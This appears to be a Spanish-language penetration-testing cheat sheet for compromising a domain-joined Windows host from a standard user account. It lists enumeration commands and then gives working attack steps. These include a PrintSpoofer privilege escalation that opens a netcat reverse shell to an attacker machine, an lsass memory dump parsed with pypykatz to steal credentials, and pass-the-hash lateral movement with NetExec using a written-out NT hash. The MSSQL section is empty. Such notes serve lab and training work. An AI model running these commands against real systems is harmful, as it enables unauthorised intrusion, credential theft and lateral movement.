# Enumeración inicial en host Windows unido a dominio (usuario interno estándar)

Tags: #AD #RDP #Session #PrivEsc #PtH #NetExec #WinRM 

Se obtiene acceso a un host Windows miembro de un dominio (no DC) con credenciales de un usuario estándar.

## Fase 1: Identificación del host

```powershell 
❯ hostname                     # Nombre del equipo → ubicarte dentro de la red
❯ whoami                       # Usuario actual (dominio\usuario)
❯ whoami /all
❯ whoami /groups               # Grupos del usuario → detectar privilegios indirectos
❯ whoami /priv                 # Privilegios del token (ej: SeImpersonatePrivilege → posible abuso)

❯ echo %USERDOMAIN%            # Dominio al que pertenece el usuario
❯ echo %LOGONSERVER%           # DC que autenticó la sesión (target clave)

❯ systeminfo                   # Info del sistema: OS, dominio, arquitectura, parches
```

## Fase 2: Enumeración de usuarios y dominio 

```powershell 
❯ net user /domain             # Lista usuarios del dominio → identificar targets
❯ net group /domain            # Lista grupos del dominio
❯ net group "Domain Admins" /domain   # Miembros con máximo privilegio en el dominio
❯ net localgroup administrators → ¿quién es admin?
```

## Fase 3: Enumeración local 

```powershell 
❯ net localgroup                  # Grupos locales del host
❯ net localgroup Administrators   # Usuarios con admin local → posible escalación / lateral movement
❯ tasklist                        # Procesos activos → detectar servicios interesantes
❯ sc query                        # Lista servicios del sistema
```

## Fase 4: Sesiones activas (Prioridad alta)

```powershell 
❯ qwinsta                      # Enumera sesiones → identifica usuarios activos
❯ query user                   # Alternativa para ver usuarios loggeados
❯ net sessions
```

## Fase 5 : Shares 

```powershell 
❯ net share                    # Shares locales del equipo
❯ net view /domain             # Lista equipos en el dominio
❯ net view \\server01          # Shares de otro host (requiere acceso)
```

## Fase 6: Búsqueda de credenciales 

```powershell 
❯ findstr /si password *.txt *.xml *.ini *.config   # Busca "password" en archivos comunes
❯ dir /s *pass*                # Busca archivos con nombres relacionados a credenciales
``` 


---
# Escalada a usuario admin 

## SeImpersonate

```powershell 
❯ whoami /priv                 # Privilegios del token (ej: SeImpersonatePrivilege → posible abuso)
```

```powershell 
'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM

❯ .\PrintSpoofer64.exe -c "cmd /c C:\tmp\nc.exe IP_Kali 4444 -e cmd"
# Utilizar PrintSpoofer64.exe para ejecutar un comando como nt authority \system para hacer una Reverse shell 

❯ rlwrap nc -nlvp 4444
# Obtener una shell como nt authority \system en kali


NOTA:
	- Subir a la máquina víctima los archivos: PrintSpoofer64.exe y netcat 
```


---

## Enumeración de usuario con una sesión activa (RDP) en el server 

```powershell 
❯ query user                   # Alternativa para ver usuarios loggeados
❯ net sessions
```

```powershell 
! Usuario Administrador local 

# Dump con Task Manager (GUI) → lsass.dmp
❯ .\procdump64.exe -accepteula -ma 632 C:\tmp\lsass.dmp

# Traer el .dmp a kali y parsear 
❯ pypykatz lsa minidump lsass.dmp


NOTA:
	- Subir a la máquina víctima el archivo: procdump64.exe
```

```bash 
# Una vez obtenido el hash NT hacer lo siguiente: 
❯ nxc smb 192.168.56.0/24 -u omar.villa -H '831486ac7f26860c9e2f51ac91e1a07a'      # Barrido para verificar en donde tiene acceso ese usuario
❯ nxc winrm 192.168.56.11 -u omar.villa -H '831486ac7f26860c9e2f51ac91e1a07a'      # Verificar si pertenece al grupo "Remote Management Users" y muestra [Pwn3d!]

# Movimiento lateral 
❯ nxc winrm <IP> -u 'user' -H 'NThash'
# Requiere hash NT → valida acceso por Pass-the-Hash
# [Pwn3d!] → puedes conectarte sin crackear la contraseña
```

--- 

## MSSQL 

```powershell 

```